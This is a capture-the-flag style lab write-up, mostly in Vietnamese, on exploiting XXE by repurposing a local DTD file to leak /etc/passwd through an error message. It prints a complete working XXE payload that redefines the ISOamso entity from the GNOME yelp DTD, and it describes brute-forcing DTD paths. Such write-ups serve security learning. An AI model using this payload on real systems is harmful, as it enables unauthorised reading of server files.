# Lab: Exploiting XXE to retrieve data by repurposing a local DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the /etc/passwd file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

Hint
Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.

# Overview:

Ta sử dụng LocalDtd khi:

- Ta có thể xác định và tham chiếu entity, nhưng ta không thể trích xuất dữ liệu in band.

- Filter dầu ra ngăn chặn out-of-band đến server.


LoacalDtd file là 1 file đã tồn tại sẵn trên server.Ta tận dụng file Dtd này bằng cách gây ra lỗi ở exfil data.

Ta có form lab

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/f12dcc68-236b-4d8a-a5bc-2ca2bc55ee83)

# Solution

Ta check stock product

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/88735202-5612-44a8-8d01-53125e802041)

Mình thử chèn những payload trước đó đã làm hay là thêm `%`, nhưng không cho kết quả gì nhiều.Nhưng khi mà mình thức cách của bài error message bằng tạo một resources không tồn tại thì lại cho ra kết quả này

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/feecb965-ddfc-4d71-95b8-2cedc749b1bb)

Theo cái response này cho phép liệt kết các existence và non-existence file hoặc là dtd file. Vậy ta cần phải tham chiếu file dtd đã tồn tại.

https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/. Nguồn tham khảo này, cung cấp khá là nhiều các loại file dtd.Mình sẽ brute force, nhớ tắt payload encode.

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/b4facb94-97c9-41af-a4bc-afcbe97fe8d7)

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/b4278634-dc85-4a96-bf66-389ca77fd2f2)

Theo hint của đề bài Dtd nằm ở đó. Sau khi có ta có thể dễ dàng tấn công hơn, ta sẽ làm giống như bài error messages, và fie này, dữ liệu của nó sẽ được tìm thấy tại [apt-browser](https://www.apt-browse.org/browse/ubuntu/bionic/main/amd64/yelp/3.26.0-1ubuntu2/file/usr/share/yelp/dtd/docbookx.dtd)

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///foobar/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/53fa593b-0cfe-4984-9a5a-91a71935ec60)

Send và đã solve được lab 

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/d7524146-1ca6-4c80-9507-d6c59ed26755)
